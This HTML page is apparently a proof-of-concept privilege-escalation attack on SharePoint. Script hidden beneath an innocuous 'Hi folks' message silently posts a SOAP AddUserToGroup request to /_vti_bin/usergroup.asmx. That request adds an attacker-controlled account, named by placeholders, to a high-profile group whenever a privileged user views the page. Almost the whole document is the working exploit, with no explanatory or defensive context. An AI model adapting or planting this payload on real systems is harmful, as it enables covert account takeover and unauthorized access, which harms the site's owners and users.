<html>

<body>


<script>
  var post_data = '<?xml version="1.0" encoding="utf-8"?><soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance
" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">  <soap12:Body>    <AddU
serToGroup xmlns="http://schemas.microsoft.com/sharepoint/soap/directory/"><groupName>Home Authority - HiProfile GroupName</gr
oupName><userName>INSIDERATTACKERNAME SURNAME</userName><userLoginName>WINDOWSDOMAIN\\ATTACKERUSERLOGIN</userLoginName><userEm
ail>ATTACKEREMAILACCOUNT@VICTIMWEBSITE.DOMAINNAME</userEmail><userNotes></userNotes></AddUserToGroup></soap12:Body></soap12:En
velope>';

  var xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  xmlhttp.open("POST", '/_vti_bin/usergroup.asmx', true);
  xmlhttp.setRequestHeader("Host", "VICTIMWEBSITE.DOMAINNAME");
  xmlhttp.setRequestHeader("Content-type", "application/soap+xml; charset=utf-8");
  xmlhttp.setRequestHeader("Content-length", post_data.length);

  xmlhttp.send(post_data);
</script>
<H1>This is my fake communication</H1>

Hi folks, how is it going?

</body>
</html>
